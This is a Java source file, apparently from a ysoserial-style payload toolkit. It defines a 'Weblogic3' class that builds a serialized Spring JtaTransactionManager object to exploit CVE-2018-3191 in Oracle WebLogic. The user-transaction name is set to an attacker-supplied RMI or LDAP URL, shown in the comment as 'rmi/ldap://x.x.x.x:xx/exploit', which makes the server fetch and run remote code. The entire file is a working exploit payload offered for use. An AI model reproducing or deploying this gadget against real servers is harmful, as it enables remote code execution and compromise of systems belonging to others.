package payloads;


import com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager;
import payloads.annotation.Authors;
import payloads.annotation.Dependencies;
import util.PayloadRunner;


/**
 *
 * Spring-tx JtxTransactionManager JNDI Injection
 *
 * Command: rmi/ldap://x.x.x.x:xx/exploit
 */

// CVE-2018-3191

@Dependencies ( {"com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager"} )
@Authors({ Authors.CCKUAILONG })
public class Weblogic3 extends PayloadRunner implements ObjectPayload<Object> {

    public Object getObject ( final String command ) throws Exception {
        JtaTransactionManager manager = new JtaTransactionManager();
        manager.setUserTransactionName(command);
        return manager;
    }

    public static byte[] getBytes (final String command, Boolean fusion) throws Exception {
        return PayloadRunner.run(Weblogic3.class, command, fusion);
    }
}
